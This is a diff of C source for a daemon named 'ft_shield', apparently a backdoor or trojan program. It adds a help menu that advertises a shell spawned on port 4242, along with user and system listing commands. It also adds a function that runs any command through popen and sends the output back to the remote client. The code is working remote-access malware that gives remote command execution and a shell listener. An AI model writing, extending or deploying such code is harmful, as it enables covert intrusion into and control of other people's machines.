@@ -1,5 +1,18 @@
 #include "ft_shield.h"
 
+void print_usage(int client_fd)
+{
+	const char *usage =
+		"ft_shield:\n"
+		"  ?           : Show this help message.\n"
+		"  shell       : Spawn a shell on port 4242.\n"
+		"  users       : List currently logged in users.\n"
+		"  system      : Display system information.\n"
+		"  quit        : Exit the daemon.\n";
+
+	send(client_fd, usage, strlen(usage), 0);
+}
+
 void	spawn_shell(t_shield *daemon, int client_fd)
 {
 	char output[] = "Spawning shell on port 4242.\n";
@@ -67,4 +80,18 @@ void	spawn_shell(t_shield *daemon, int client_fd)
 	}
 	else
 		setup_socket(daemon);
+}
+
+void	send_cmd_output(const char *cmd, int client_fd)
+{
+	FILE *fp;
+	char buffer[BUFFER_SIZE];
+
+	fp = popen(cmd, "r");
+	if (!fp)
+		return ;
+
+	while (fgets(buffer, sizeof(buffer), fp))
+		send(client_fd, buffer, strlen(buffer), 0);
+	pclose(fp);
 }
